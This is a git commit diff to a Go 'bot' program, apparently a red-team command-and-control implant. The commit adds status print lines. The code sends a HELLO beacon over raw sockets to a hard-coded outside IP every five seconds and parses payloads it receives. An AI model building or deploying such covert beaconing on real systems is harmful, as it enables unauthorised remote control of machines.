8f7d3925207bdd6aa6c5e379030492c5af279701
oneNutW0nder <scb5436@rit.edu>
2019-10-23 04:03:33 -0400

    Printing information

--- cmd/bot/bot.go
+++ cmd/bot/bot.go
@@ -17,13 +17,12 @@ func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.Hardware
 		fd := cattails.NewSocket()
 		defer unix.Close(fd)
 
-		fmt.Println("Sending")
-
 		packet := cattails.CreatePacket(iface, src, dst, dstMAC, cattails.CreateHello(iface.HardwareAddr, src))
 
 		addr := cattails.CreateAddrStruct(iface)
 
 		cattails.SendPacket(fd, iface, addr, packet)
+		fmt.Println("[+] Sent HELLO")
 		// Send hello every 5 seconds
 		time.Sleep(5 * time.Second)
 	}
@@ -31,11 +30,11 @@ func sendHello(iface *net.Interface, src net.IP, dst net.IP, dstMAC net.Hardware
 
 func botProcessPacket(packet gopacket.Packet) {
 
+	fmt.Println("[+] Payload Received")
 	data := string(packet.ApplicationLayer().Payload())
 
 	payload := strings.Split(data, " ")
 	fmt.Println("Payload:", payload)
-
 }
 
 func main() {
@@ -44,18 +43,23 @@ func main() {
 
 	readfd := cattails.NewSocket()
 	defer unix.Close(readfd)
+	fmt.Println("[+] Socket created")
 
 	iface, src := cattails.GetOutwardIface("8.8.8.8:80")
+	fmt.Println("[+] Using interface:", iface.Name)
 
 	dstMAC, err := cattails.GetRouterMAC()
 	if err != nil {
 		log.Fatal(err)
 	}
+	fmt.Println("DST MAC:", dstMAC.String())
 
 	// 18.191.209.30
+	fmt.Println("[+] Starting HELLO timer")
 	go sendHello(iface, src, net.IPv4(18, 191, 209, 30), dstMAC)
 
 	// Listen for responses
+	fmt.Println("[+] Listening")
 	for {
 		packet := cattails.BotReadPacket(readfd, vm)
 
